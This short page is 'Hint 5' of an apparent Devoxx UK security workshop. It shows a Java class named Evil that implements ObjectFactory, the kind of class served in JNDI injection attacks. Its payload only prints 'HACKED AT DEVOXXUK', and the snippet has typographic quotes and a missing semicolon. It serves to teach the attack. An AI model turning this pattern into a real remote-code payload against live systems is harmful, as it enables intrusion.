# Hint 5

Full implementation for Evil:
```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public  class Evil implements  ObjectFactory  {
   @Override
   public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)
           throws Exception {
       System.out.println(“HACKED AT DEVOXXUK”)
       return  null;
   }
}
```